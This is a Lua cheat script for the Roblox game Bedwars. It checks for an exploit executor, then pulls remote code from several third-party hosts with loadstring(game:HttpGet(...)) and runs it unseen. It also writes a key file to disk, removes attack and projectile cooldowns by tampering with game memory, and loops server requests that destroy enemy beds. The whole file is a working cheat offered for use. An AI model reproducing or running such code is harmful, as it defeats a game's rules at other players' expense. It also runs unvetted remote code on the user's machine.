if not game:IsLoaded() then
	local Notify = game:GetService("StarterGui")
	Notify:SetCore("SendNotification", {
		Title = "Bedwars Combo";
		Text = "Game currently not loaded.";
		Icon = "rbxassetid://4914902889";
		Duration = 0.4;
	})
	local notloadednoti = Instance.new("Message", workspace)
	notloadednoti.Text = 'Waiting for game to finish loading.'
	game.Loaded:Wait()
	warn("[Bedwars Combo] [Info] Game has successfully loaded.")
	notloadednoti:Destroy()
end

loadstring(game:HttpGet("https://irishost.xyz/InfinityHosting/IrisInit.lua"))()

local NotifyUser = game:GetService("StarterGui")

NotifyUser:SetCore("SendNotification", {
	Title = "Bedwars Combo";
	Text = "Validating Executor..";
	Icon = "rbxassetid://4914902889";
	Duration = 0.8;
})

local exploit_type
if syn then
	exploit_type = "Synapse X"
elseif KRNL_LOADED then
	exploit_type = "KRNL"
	loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterCompat.lua"))()
elseif FLUXUS_LOADED then
	exploit_type = "Fluxus"
	loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterCompat.lua"))()
elseif getexecutorname then 
	exploit_type = "Script-Ware"
else
	game.Players.LocalPlayer:Kick("EW IMAGINE USING SHITTY HACKS LOL")
	error("Executor not Supported!")
end
if true then
	warn("[Bedwars Combo] [Info] Your Executor is: [".. exploit_type.. "]")
end

wait(1.5)

NotifyUser:SetCore("SendNotification", {
	Title = "Bedwars Combo";
	Text = "Valid Exploit Detected: [".. exploit_type.. "]";
	Icon = "rbxassetid://4914902889";
	Duration = 3;
})

NotifyUser:SetCore("SendNotification", {
	Title = "Bedwars Combo";
	Text = "Made By Bleedo";
	Icon = "rbxassetid://4914902889";
	Duration = 3;
})

if syn then
	loadstring(game:HttpGet("https://dogix.wtf/scripts/noboline/7709aec8-70df-45fe-b075-ac2097dbb5ac"))()
elseif KRNL_LOADED then
	
	getgenv()["IrisAd"]=true

	local Notification = loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterNotifications.lua"))()

	Notification.WallNotification("SCRIPT CREDITS", "MADE BY BLEEDO !", {
		MainSettings = {
			Orientation = "Left",
			VisibleSize = UDim2.new(0.5, 0, 0.5, 0);
			HiddenSize  = UDim2.new(0, 0, 0.5, 0),
			TweenTime   = 0.8
		},
	})
	
	local FileLocated = isfile("WhiteKey.lua")

	if not FileLocated then
		writefile("WhiteKey.lua", '{"whitekey":"newupdaterobloxisbad"}')
	end
	
	wait(0.0001)
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxhubs/robloxscript/main/script.lua"))()
	
	for i,v in pairs(getgc(true)) do
		pcall(function()
			if type(v) == 'table' and v.sword then
				v.sword.attackSpeed = 0
			end
			if type(v) == 'table' and v.projectileSource then
				v.projectileSource.fireDelaySec = 0
			end
		end)
	end
	
	while wait() do
		pcall(function()
			for i,v in pairs(game:GetService("Workspace").Map.Blocks:GetChildren()) do
				if v.Name == "bed" and v.Covers.BrickColor ~= game.Players.LocalPlayer.TeamColor and game.Players.LocalPlayer:DistanceFromCharacter(v.Position) < 150 then
					spawn(function()
						game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.BreakBlock:InvokeServer({
							["blockRef"] = {
								["blockPosition"] = v.Position/3--.new(186, 14, 108)
							},
							["hitPosition"] = v.Position,
							["hitNormal"] = Vector3.new(1, 0, 0)
						})
					end)
				end
			end
		end)
	end
elseif FLUXUS_LOADED then
	
	getgenv()["IrisAd"]=true

	local Notification2 = loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterNotifications.lua"))()

	Notification2.WallNotification("SCRIPT CREDITS", "MADE BY BLEEDO !", {
		MainSettings = {
			Orientation = "Left",
			VisibleSize = UDim2.new(0.5, 0, 0.5, 0);
			HiddenSize  = UDim2.new(0, 0, 0.5, 0),
			TweenTime   = 0.8
		},
	})
	
	local FileLocated2 = isfile("WhiteKey.lua")

	if not FileLocated2 then
		writefile("WhiteKey.lua", '{"whitekey":"newupdaterobloxisbad"}')
	end

	wait(0.0001)

	loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxhubs/robloxscript/main/script.lua"))()

	for i,v in pairs(getgc(true)) do
		pcall(function()
			if type(v) == 'table' and v.sword then
				v.sword.attackSpeed = 0
			end
			if type(v) == 'table' and v.projectileSource then
				v.projectileSource.fireDelaySec = 0
			end
		end)
	end

	while wait() do
		pcall(function()
			for i,v in pairs(game:GetService("Workspace").Map.Blocks:GetChildren()) do
				if v.Name == "bed" and v.Covers.BrickColor ~= game.Players.LocalPlayer.TeamColor and game.Players.LocalPlayer:DistanceFromCharacter(v.Position) < 150 then
					spawn(function()
						game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.BreakBlock:InvokeServer({
							["blockRef"] = {
								["blockPosition"] = v.Position/3--.new(186, 14, 108)
							},
							["hitPosition"] = v.Position,
							["hitNormal"] = Vector3.new(1, 0, 0)
						})
					end)
				end
			end
		end)
	end
end
